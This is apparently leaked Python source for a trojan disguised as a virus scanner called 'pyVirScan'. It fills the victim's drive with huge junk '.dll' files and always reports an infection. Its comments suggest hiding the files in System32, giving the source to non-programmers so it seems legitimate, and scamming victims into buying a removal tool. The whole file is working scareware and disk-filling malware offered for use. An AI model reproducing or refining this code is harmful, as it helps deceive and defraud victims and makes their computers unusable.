#Rewinds's trojan
import win32file
import os
 
def get_drivestats():
    #This retrieves the amount of free space on the drive in bytes
    drive = os.path.splitdrive(os.getcwd())[0].rstrip(':')
    sectPerCluster, bytesPerSector, freeClusters, totalClusters = \
        win32file.GetDiskFreeSpace(drive + ":\\")
    free_space = freeClusters*sectPerCluster*bytesPerSector
    return free_space, drive
print ("-"*40)
print ("-" + " " * 9 + "Welcome to pyVirScan" + " " * 9 + "-")
print ("-" + " " * 2 + "A Virus Scanner written in Python!" + " " * 2 + "-")
print ("-" + " " * 13 + "Version 1.00" + " " * 13 + "-")
print ("-"*40)
print ("Be patient, you will be notified when the scan is complete")
#print ("Current Progress: 0.01%")
 
free_space, drive = get_drivestats()
 
#Convert free_space to kb and store in a variable
kb = float(1024)
kbFree = free_space / kb
 
#Find the amount of files you need to create to *almost* fill the drive
fillWithFloat = kbFree / 409600
 
#convert the amount of files needed to create from a
fillWithInt = int(round(fillWithFloat))
loopNum = 1
 
 
 
for y in range(fillWithInt):
    block = '0' * 409600
    #This saves the files to the current directory, but change it so that it changes it to System 32, so the victim can't find the file they are trying to delete!
    bigFile = file("sysscanresults" + str(loopNum) + ".dll", 'wb')
    for x in range(1000):
        bigFile.write(block)
    bigFile.close()
        #Didn't finish writing the percent complete function, you can uncomment and fix the lines of code if you want
    #percentComplete = loopNum * fillWithInt / 100
    #print ("Current Progress: " + str(percentComplete) + "%")
    loopNum += 1
 
#I don't know why I did this...
#Maybe so that you can give the source to someone who doesn't know python
#and get them to run it! so it looks more legitimate... mwahaha
if 1 == 1:
    virus = 1
if 1 != 1:
    virus = 0
 
print ("-"*40)
print (" " * 12 + "Scan Completed!")
print (" -"*20)
print ("Results:")
if virus == 1:
    #This will always be true, unless the source is edited
    #For scamming purposes you could tell them to buy a virus
    #removal tool or something of the like.
    print("The results were positive, your computer is infected.")
   
    #Yet to add the text file creation
    #print("To see the full list of results, navigate to C:\\results.txt")
    #print("In the text file you will see:")
    #print ("1) What you are infected by.")
    #print ("2) Details of each infection.")
    #print ("3) What you can do to remove the virus'.")
 
if virus == 0:
    print("Your computer is clean!")
 
 
print ("Thankyou for using pyVirScan")
print ("-"*40)
exit = raw_input("Press <enter> to exit...")
 
   
   ~RewindsHF      
   ~Rewinds (Leak)